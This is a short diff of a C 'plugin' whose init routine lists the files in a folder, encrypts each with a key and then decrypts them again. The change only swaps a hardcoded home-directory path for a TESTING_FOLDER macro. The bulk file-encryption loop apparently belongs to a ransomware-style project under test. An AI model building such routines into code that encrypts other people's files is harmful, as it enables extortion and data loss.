@@ -8,6 +8,7 @@
 #include "../include/types.h"
 #include "../include/system_utils.h"
 
+#define TESTING_FOLDER "/home/solanav/back/"
 #define MAX_NAME 256
 #define N_FILE_NAME_LEN strlen(file_name) + strlen(FILE_EXTENSION) + 1
 #define META_SIZE 512
@@ -22,7 +23,7 @@ int init_plugin()
     char *full_path = (char *)calloc(MAX_NAME + 1, sizeof(char));
 
     // Get list of unencrypted files
-    char **list = list_files("/home/solanav/back");
+    char **list = list_files(TESTING_FOLDER);
     if (!list)
         return ERROR;
 
@@ -33,7 +34,7 @@ int init_plugin()
     // Encrypt files
     for (int i = 0; i < 256 && strcmp(list[i], ""); i++)
     {
-        full_path = strncat(full_path, "/home/solanav/back/", MAX_NAME - strlen(full_path));
+        full_path = strncat(full_path, TESTING_FOLDER, MAX_NAME - strlen(full_path));
         full_path = strncat(full_path, list[i], MAX_NAME - strlen(full_path));
         encrypt_file(full_path, key);
         memset(full_path, '\0', MAX_NAME);
@@ -47,13 +48,13 @@ int init_plugin()
 	free(list);
     
     // Get new list
-    list = list_files("/home/solanav/back");
+    list = list_files(TESTING_FOLDER);
     if (!list)
         return ERROR;
 
     for (int i = 0; i < 256 && strcmp(list[i], ""); i++)
     {
-        full_path = strncat(full_path, "/home/solanav/back/", MAX_NAME - strlen(full_path));
+        full_path = strncat(full_path, TESTING_FOLDER, MAX_NAME - strlen(full_path));
         full_path = strncat(full_path, list[i], MAX_NAME - strlen(full_path));
         if (decrypt_file(full_path, key) == ERROR) {
 #ifdef DEBUG
